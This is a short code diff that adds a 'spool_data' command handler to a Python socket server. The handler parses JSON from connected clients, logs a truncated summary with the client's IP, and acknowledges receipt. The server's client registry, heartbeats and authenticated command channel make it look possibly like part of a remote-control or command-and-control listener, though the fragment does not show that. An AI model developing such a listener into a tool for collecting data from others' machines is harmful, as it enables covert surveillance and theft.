@@ -177,6 +177,17 @@ def handle_new_client(client_socket, address, auth_user, auth_pass, key):
                         if cid in clients:
                             clients[cid]["last_seen"] = time.time()
                     continue
+                elif command.startswith("spool_data "):
+                    raw = command[len("spool_data "):]
+                    try:
+                        data = json.loads(raw)
+                        kind = data.get("kind", "unknown")
+                        payload = data.get("payload", {})
+                        ts = data.get("ts", 0)
+                        print(f"\n[SPOOL] {kind} from {address[0]} @ {ts}: {str(payload)[:80]}")
+                        send_msg(client_socket, "SPOOL_ACK", key)
+                    except Exception as e:
+                        send_msg(client_socket, "SPOOL_NACK", key)
             except Exception:
                 break
 
